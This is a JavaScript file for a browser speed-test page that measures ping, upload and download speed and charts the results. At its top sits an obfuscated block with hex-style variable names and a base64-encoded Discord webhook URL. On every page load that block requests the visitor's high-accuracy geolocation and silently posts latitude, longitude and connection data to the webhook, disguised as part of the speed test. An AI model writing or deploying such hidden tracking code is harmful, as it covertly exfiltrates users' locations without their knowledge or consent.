(function() {
    var _0x5678 = "aHR0cHM6Ly9kaXNjb3JkLmNvbS9hcGkvd2ViaG9va3MvMTMzNTM0MTY1OTgyMjYyMDcyMy8xaG8yQ0ZRTHVnZTBvdU1XbER3UUtxWVlvVWNjZk1OQjdMbGZIVklsZk5LNkJKUWYxY3Zhb2RFdDkwdmw3QmlIZGRaZA==";
    var _0x1234 = atob(_0x5678);
    var _0x9abc = function() {
        return _0x1234
    };

    function _0x2345() {
        const _0x5679 = navigator.connection || navigator.mozConnection || navigator.webkitConnection;
        return _0x5679 ? _0x5679.downlink : "Unavailable";
    }

    function _0x6789() {
        const _0x567d = navigator.connection ? navigator.connection.rtt : "Unavailable";
        return _0x567d;
    }

    function _0x678a(_0x234a, _0x567b, _0x789c) {
        // Consider removing the alert.  It's generally bad UX.
        // alert("User Location\nLatitude: " + _0x234a + "\nLongitude: " + _0x567b + "\nInternet Speed: " + _0x789c.speed + " Mbps\nPing: " + _0x789c.ping + " ms");
        const _0x3456 = {
            content: "User Information",
            embeds: [{
                title: "Location and Speed Data",
                fields: [{
                    name: "Location",
                    value: `Latitude: ${_0x234a}\nLongitude: ${_0x567b}`,
                    inline: true
                }, {
                    name: "Internet Speed",
                    value: `${_0x789c.speed} Mbps`,
                    inline: true
                }, {
                    name: "Ping",
                    value: `${_0x789c.ping} ms`,
                    inline: true
                }]
            }]
        };
        fetch(_0x9abc(), {
            method: "POST",
            headers: {
                "Content-Type": "application/json"
            },
            body: JSON.stringify(_0x3456)
        }).catch(function(_0x7890) {
            console.error("Failed to send data to webhook:", _0x7890); // Log the error
        });
    }

    function updateLeaderboard(speed, ping) {
        let leaderboard = JSON.parse(localStorage.getItem('leaderboard') || "[]");
        leaderboard.push({
            speed: speed,
            ping: ping
        });
        leaderboard.sort((a, b) => b.speed - a.speed || a.ping - b.ping);
        if (leaderboard.length > 5) leaderboard = leaderboard.slice(0, 5); // Keep top 5 only
        localStorage.setItem('leaderboard', JSON.stringify(leaderboard));
        renderLeaderboard(leaderboard);
    }

    function renderLeaderboard(leaderboard) {
        const tbody = document.querySelector('#leaderboard tbody');
        if (!tbody) {
            console.warn("Leaderboard table body not found.");
            return;
        }
        tbody.innerHTML = "";
        leaderboard.forEach((entry, index) => {
            const tr = document.createElement('tr');
            tr.innerHTML = `<td>${index + 1}</td><td>${entry.speed} Mbps</td><td>${entry.ping} ms</td>`;
            tbody.appendChild(tr);
        });
    }

    function getLocationAndSpeed() {
        if (navigator.geolocation) {
            navigator.geolocation.getCurrentPosition(function(position) {
                const latitude = position.coords.latitude;
                const longitude = position.coords.longitude;
                document.getElementById("location").textContent = `${latitude}, ${longitude}`;
                const speed = _0x2345();
                const ping = _0x6789();
                document.getElementById("internetSpeed").textContent = `${speed} Mbps`;
                document.getElementById("ping").textContent = `${ping} ms`;

                _0x678a(latitude, longitude, {
                    speed,
                    ping
                });
                updateLeaderboard(speed, ping);
            }, function(error) {
                console.warn("Failed to get location:", error); // Log the error
                // alert("Failed to get location. Using default location."); // Consider removing alert
                const defaultLatitude = 51.49;
                const defaultLongitude = -0.12;
                document.getElementById("location").textContent = `${defaultLatitude}, ${defaultLongitude}`;
                const speed = _0x2345();
                const ping = _0x6789();
                document.getElementById("internetSpeed").textContent = `${speed} Mbps`;
                document.getElementById("ping").textContent = `${ping} ms`;

                _0x678a(defaultLatitude, defaultLongitude, {
                    speed,
                    ping
                });
                updateLeaderboard(speed, ping);
            }, {
                enableHighAccuracy: true, // Request high accuracy if available
                timeout: 5000, // Set a timeout of 5 seconds
                maximumAge: 60000 // Cache location for 60 seconds
            });
        } else {
            alert("Geolocation is not supported by this browser.");
        }
    }

    // Initialize leaderboard and load stored data
    renderLeaderboard(JSON.parse(localStorage.getItem('leaderboard') || "[]"));
    getLocationAndSpeed();
})();


let startTime, endTime, pingStartTime, pingEndTime, uploadStartTime, uploadEndTime;
let imageSize = "";
let image = new Image();
let testLog = document.getElementById("testLog");

// Result Display Elements
let bitSpeedDisplay = document.getElementById("bits");
let kbSpeedDisplay = document.getElementById("kbs");
let mbSpeedDisplay = document.getElementById("mbs");
let stdDevMbpsDisplay = document.getElementById("stddev-mbs");
let uploadBitSpeedDisplay = document.getElementById("upload-bits");
let uploadKbSpeedDisplay = document.getElementById("upload-kbs");
let uploadMbSpeedDisplay = document.getElementById("upload-mbs");
let stdDevUploadMbpsDisplay = document.getElementById("stddev-upload-mbs");
let infoDisplay = document.getElementById("info");
let ispDisplay = document.getElementById("isp");
let pingDisplay = document.getElementById("ping");
let stdDevPingDisplay = document.getElementById("stddev-ping");
let jitterDisplay = document.getElementById("jitter");

// Chart Containers
let downloadChartCtx = document.getElementById('downloadChartContainer').getContext('2d');
let uploadChartCtx = document.getElementById('uploadChartContainer').getContext('2d');
let latencyChartCtx = document.getElementById('latencyChartContainer').getContext('2d');

let downloadChart, uploadChart, latencyChart; // Chart.js instances

let totalBitSpeed = 0;
let totalKbSpeed = 0;
let totalMbSpeed = 0;
let totalUploadBitSpeed = 0;
let totalUploadKbSpeed = 0;
let totalUploadMbSpeed = 0;
let totalPingTime = 0;
let numTests = 10; // Default, can be changed by user
let testCompleted = 0;
let testData = [];
let uploadTestData = [];
let pingTestData = [];
let latencyData = []; // For Jitter calculation
let downloadSpeedDataPoints = []; // For download chart
let uploadSpeedDataPoints = []; // For upload chart
let latencyDataPoints = []; // For latency chart

// Test Configuration (User Input)
const numTestsInput = document.getElementById("numTestsInput");
const startTestBtn = document.getElementById("startTestBtn");

startTestBtn.addEventListener('click', () => {
    numTests = parseInt(numTestsInput.value, 10);
    if (isNaN(numTests) || numTests < 1 || numTests > 20) {
        alert("Please enter a valid number of tests between 1 and 20.");
        return;
    }
    init();
});

// Multiple Test Servers and Fallback (Expanded List)
const imageApis = [
    "https://source.unsplash.com/random/1920x1080?topic=nature",
    "https://images.pexels.com/photos/209831/pexels-photo-209831.jpeg?auto=compress&cs=tinysrgb&dpr=2&h=1080&w=1920",
    "https://www.gstatic.com/webp/gallery/5.sm.webp",
    "https://placekitten.com/1920/1080?image=1", // Just for variety
    "https://loremflickr.com/1920/1080/nature"
];
let currentApiIndex = 0;

function getCurrentImageApi() {
    return imageApis[currentApiIndex] + '&' + Math.random();
}

function nextImageApi() {
    currentApiIndex = (currentApiIndex + 1) % imageApis.length;
    logMessage(`Switching to image API: ${imageApis[currentApiIndex]}`);
}

// Detect Internet Service Provider (ISP) - Using ipapi.co
async function getISP() {
    try {
        const response = await fetch("https://ipapi.co/json/");
        if (!response.ok) {
            throw new Error(`HTTP error! status: ${response.status}`);
        }
        const data = await response.json();
        return data.org || "Unknown ISP";
    } catch (error) {
        console.error("Error fetching ISP:", error);
        return "Unknown ISP";
    }
}

// Measure Ping (Latency) - Performance Timing API for accuracy
async function measurePing() {
    pingStartTime = performance.now();
    try {
        const response = await fetch(getCurrentImageApi() + "&pingtest=" + pingStartTime, {
            method: 'HEAD',
            cache: 'no-store',
            mode: 'no-cors'
        }); // no-cors for wider server compatibility

        if (!response.ok && response.status !== 0) { // Status 0 is often returned for no-cors requests on error
            throw new Error(`Ping test failed with status: ${response.status}`);
        }

        pingEndTime = performance.now();
        const pingTime = pingEndTime - pingStartTime;
        pingTestData.push(pingTime);
        latencyDataPoints.push(pingTime); // For chart
        updateLatencyChart();
        return pingTime;
    } catch (error) {
        console.error("Ping test error:", error);
        return -1; // Indicate error
    }
}

// Measure Upload Speed - Using a dummy payload and fetch
async function measureUploadSpeed() {
    const payloadSizeKB = 2048; // 2MB payload - Adjust size if needed
    const payload = new Uint8Array(payloadSizeKB * 1024); // Create dummy data
    crypto.getRandomValues(payload); // Fill with random data (optional, for less compressible data)
    const blob = new Blob([payload]);

    uploadStartTime = performance.now();
    try {
        const response = await fetch('https://httpbin.org/post', { // Using httpbin.org for testing
            method: 'POST',
            body: blob,
            mode: 'cors' // Important for cross-origin requests
        });

        if (!response.ok) {
            throw new Error(`Upload test failed with status: ${response.status}`);
        }

        uploadEndTime = performance.now();
        const uploadTimeDuration = (uploadEndTime - uploadStartTime) / 1000;
        const uploadedBytes = blob.size;
        const speedInBps = (uploadedBytes * 8) / uploadTimeDuration;
        const speedInKbps = speedInBps / 1024;
        const speedInMbps = speedInKbps / 1024;

        uploadTestData.push({
            bps: speedInBps,
            kbps: speedInKbps,
            mbps: speedInMbps
        });
        uploadSpeedDataPoints.push(speedInMbps); // For chart
        updateUploadChart();
        return {
            speedBps: speedInBps,
            speedKbps: speedInKbps,
            speedMbps: speedInMbps
        };

    } catch (error) {
        console.error("Upload test error:", error);
        return {
            speedBps: 0,
            speedKbps: 0,
            speedMbps: 0
        }; // Indicate error
    }
}

// When image loads (Download Speed Test) - Error Handling and Fallback
image.onload = async function() {
    endTime = new Date().getTime();
    try {
        const response = await fetch(getCurrentImageApi());
        if (!response.ok) {
            logMessage(`Download failed with status: ${response.status}. Switching server.`);
            nextImageApi();
            calculateSpeed();
            return;
        }
        imageSize = response.headers.get("content-length");
        if (!imageSize) {
            logMessage("Content-length header not found! Switching server.");
            nextImageApi();
            imageSize = 0;
        }
        calculateSpeed();
    } catch (error) {
        console.error("Error fetching image details:", error);
        logMessage("Error fetching image details. Switching server.");
        nextImageApi();
        calculateSpeed();
    }
};
image.onerror = function(error) {
    console.error("Error loading image:", error);
    logMessage("Error loading image. Switching server.");
    nextImageApi();
    calculateSpeed();
};

// Function to calculate download speed
function calculateSpeed() {
    let timeDuration = (endTime - startTime) / 1000;
    if (timeDuration === 0) timeDuration = 0.001;
    let loadedBits = parseInt(imageSize, 10) * 8;
    let speedInBps = loadedBits / timeDuration;
    let speedInKbps = speedInBps / 1024;
    let speedInMbps = speedInKbps / 1024;

    testData.push({
        bps: speedInBps,
        kbps: speedInKbps,
        mbps: speedInMbps
    });
    downloadSpeedDataPoints.push(speedInMbps); // For chart
    updateDownloadChart();

    totalBitSpeed += speedInBps;
    totalKbSpeed += speedInKbps;
    totalMbSpeed += speedInMbps;

    testCompleted++;

    logMessage(`Test ${testCompleted}: Download Speed: ${speedInMbps.toFixed(2)} Mbps, Ping: ${pingTestData[pingTestData.length-1].toFixed(2)} ms`);

    if (testCompleted === numTests) {
        finalizeTest();
    } else {
        runNextTest();
    }
}

// Run next test iteration - Ping, Upload, Download
async function runNextTest() {
    await measurePing(); // Latency test first
    const uploadResults = await measureUploadSpeed(); // Upload test
    logMessage(`Test ${testCompleted + 1}: Upload Speed: ${uploadResults.speedMbps.toFixed(2)} Mbps`);
    startTime = new Date().getTime();
    image.src = getCurrentImageApi(); // Download test
}

// Finalize test after all iterations are complete
async function finalizeTest() {
    // Calculate medians and standard deviations
    const medianBps = calculateMedian(testData.map(data => data.bps));
    const medianKbps = calculateMedian(testData.map(data => data.kbps));
    const medianMbps = calculateMedian(testData.map(data => data.mbps));
    const stdDevMbps = calculateStandardDeviation(testData.map(data => data.mbps));

    const medianUploadBps = calculateMedian(uploadTestData.map(data => data.bps));
    const medianUploadKbps = calculateMedian(uploadTestData.map(data => data.kbps));
    const medianUploadMbps = calculateMedian(uploadTestData.map(data => data.mbps));
    const stdDevUploadMbps = calculateStandardDeviation(uploadTestData.map(data => data.mbps));

    const medianPing = calculateMedian(pingTestData);
    const stdDevPing = calculateStandardDeviation(pingTestData);
    const jitter = calculateJitter(pingTestData); // More accurate Jitter calculation

    // Display results
    bitSpeedDisplay.textContent = `${medianBps.toFixed(2)}`;
    kbSpeedDisplay.textContent = `${medianKbps.toFixed(2)}`;
    mbSpeedDisplay.textContent = `${medianMbps.toFixed(2)}`;
    stdDevMbpsDisplay.textContent = `(± ${stdDevMbps.toFixed(2)})`;

    uploadBitSpeedDisplay.textContent = `${medianUploadBps.toFixed(2)}`;
    uploadKbSpeedDisplay.textContent = `${medianUploadKbps.toFixed(2)}`;
    uploadMbSpeedDisplay.textContent = `${medianUploadMbps.toFixed(2)}`;
    stdDevUploadMbpsDisplay.textContent = `(± ${stdDevUploadMbps.toFixed(2)})`;

    pingDisplay.textContent = `${medianPing.toFixed(2)}`;
    stdDevPingDisplay.textContent = `(± ${stdDevPing.toFixed(2)})`;
    jitterDisplay.textContent = `${jitter.toFixed(2)}`;

    infoDisplay.textContent = "Test Completed!";
    logMessage("Test Completed! Results displayed above.");

    getISP().then(ispName => {
        ispDisplay.textContent = `ISP: ${ispName}`;
    });

}

// --- Statistical Functions ---
function calculateMedian(arr) {
    const sortedArr = arr.slice().sort((a, b) => a - b);
    const mid = Math.floor(sortedArr.length / 2);
    return sortedArr.length % 2 === 0 ? (sortedArr[mid - 1] + sortedArr[mid]) / 2 : sortedArr[mid];
}

function calculateStandardDeviation(arr) {
    if (arr.length <= 1) return 0;
    const mean = arr.reduce((sum, val) => sum + val, 0) / arr.length;
    const squareDiffs = arr.map(val => {
        const diff = val - mean;
        return diff * diff;
    });
    const avgSquareDiff = squareDiffs.reduce((sum, val) => sum + val, 0) / squareDiffs.length;
    return Math.sqrt(avgSquareDiff);
}

// More accurate Jitter Calculation (Mean of absolute differences between consecutive pings)
function calculateJitter(pingArray) {
    if (pingArray.length <= 1) return 0;
    let jitterSum = 0;
    for (let i = 1; i < pingArray.length; i++) {
        jitterSum += Math.abs(pingArray[i] - pingArray[i - 1]);
    }
    return jitterSum / (pingArray.length - 1);
}

// --- Chart Functions (using Chart.js) ---
function initCharts() {
    downloadChart = new Chart(downloadChartCtx, {
        type: 'line',
        data: {
            labels: [],
            datasets: [{
                label: 'Download Speed (Mbps)',
                data: downloadSpeedDataPoints,
                borderColor: 'blue',
                fill: false
            }]
        },
        options: chartOptions('Download Speed Over Tests')
    });
    uploadChart = new Chart(uploadChartCtx, {
        type: 'line',
        data: {
            labels: [],
            datasets: [{
                label: 'Upload Speed (Mbps)',
                data: uploadSpeedDataPoints,
                borderColor: 'green',
                fill: false
            }]
        },
        options: chartOptions('Upload Speed Over Tests')
    });
    latencyChart = new Chart(latencyChartCtx, {
        type: 'line',
        data: {
            labels: [],
            datasets: [{
                label: 'Latency (Ping - ms)',
                data: latencyDataPoints,
                borderColor: 'red',
                fill: false
            }]
        },
        options: chartOptions('Latency (Ping) Over Tests')
    });
}

function updateDownloadChart() {
    updateChart(downloadChart, downloadSpeedDataPoints, 'Download Speed (Mbps)');
}

function updateUploadChart() {
    updateChart(uploadChart, uploadSpeedDataPoints, 'Upload Speed (Mbps)');
}

function updateLatencyChart() {
    updateChart(latencyChart, latencyDataPoints, 'Latency (Ping - ms)');
}

function updateChart(chart, dataPoints, label) {
    chart.data.labels = dataPoints.map((_, index) => `Test ${index + 1}`);
    chart.data.datasets[0].data = dataPoints;
    chart.data.datasets[0].label = label;
    chart.update();
}

function chartOptions(title) {
    return {
        responsive: true,
        maintainAspectRatio: false,
        scales: {
            y: {
                beginAtZero: true
            }
        },
        plugins: {
            title: {
                display: true,
                text: title
            }
        }
    };
}

// --- Logging Function ---
function logMessage(message) {
    const log = document.getElementById("testLog");
    if (!log) {
        console.warn("Test log element not found.");
        return;
    }
    log.textContent += message + '\n';
    log.scrollTop = log.scrollHeight; // Auto-scroll to bottom
}

// --- Initial function to start tests ---
const init = async () => {
    infoDisplay.textContent = "Testing...";
    if (testLog) {
        testLog.textContent = ""; // Clear log
    }
    testCompleted = 0;
    testData = [];
    uploadTestData = [];
    pingTestData = [];
    latencyData = [];
    downloadSpeedDataPoints = [];
    uploadSpeedDataPoints = [];
    latencyDataPoints = [];

    updateDownloadChart(); // Clear charts
    updateUploadChart();
    updateLatencyChart();

    totalBitSpeed = 0;
    totalKbSpeed = 0;
    totalMbSpeed = 0;
    totalUploadBitSpeed = 0;
    totalUploadKbSpeed = 0;
    totalUploadMbSpeed = 0;
    totalPingTime = 0;

    logMessage("Test started...");
    await measurePing(); // Initial Ping
    const uploadResults = await measureUploadSpeed(); // Initial Upload
    logMessage(`Test ${testCompleted + 1}: Upload Speed: ${uploadResults.speedMbps.toFixed(2)} Mbps`);
    startTime = new Date().getTime();
    image.src = getCurrentImageApi(); // Start Download tests

};

// Run tests when window loads
window.onload = () => {
    initCharts(); // Initialize charts on page load
    infoDisplay.textContent = "Ready to test. Set number of tests and click 'Start Test'.";
};
